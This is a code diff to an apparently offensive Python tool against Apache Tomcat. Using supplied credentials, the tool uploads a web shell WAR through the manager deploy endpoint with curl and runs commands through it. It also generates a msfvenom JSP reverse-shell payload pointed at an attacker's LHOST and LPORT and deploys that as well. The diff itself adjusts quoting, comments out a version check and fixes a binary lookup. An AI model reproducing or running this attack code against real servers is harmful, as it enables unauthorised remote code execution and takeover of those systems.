@@ -210,7 +210,7 @@ class authenticated_attack(tomcat):
                 response = requests.get(url=f"{self.url}/web_shell/index.jsp")
 
                 if response.status_code != 200:
-                    command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
+                    command = f"curl --upload-file webshell/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
                     subprocess.run(command, shell=True, check=True)
 
                 response = self.execute_webshell_cmd(cmd="whoami")
@@ -250,7 +250,7 @@ class authenticated_attack(tomcat):
                         ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
                          "-f", "war", "-o", f"{filename}.war"], check=True, capture_output=True)
 
-                    command = f'curl --upload-file {filename}.war -u "{self.username}:{self.password}" "{self.url}manager/text/deploy?path=/{filename}"'
+                    command = f"curl --upload-file {filename}.war -u '{self.username}:{self.password}' '{self.url}manager/text/deploy?path=/{filename}'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
                     output.message(state="success", description="Uploading revershell", clear_before=False)
 
@@ -325,15 +325,15 @@ def main():
 
     tomcat_instance = tomcat(url=args.url)
 
-    if Version(tomcat_instance.version_detection()) < Version("10"):
-        # make something with it later
-        pass
+    #if Version(tomcat_instance.version_detection()) < Version("10"):
+    #   # make something with it later
+    #    pass
 
     binary_msfvenom = "msfvenom"
     msfvenom_path = shutil.which(binary_msfvenom)
 
     binary_curl = "curl"
-    curl_path = shutil.which(binary_msfvenom)
+    curl_path = shutil.which(binary_curl)
 
     if msfvenom_path is None:
         output.message("error", f"{binary_msfvenom} is not installed", False)
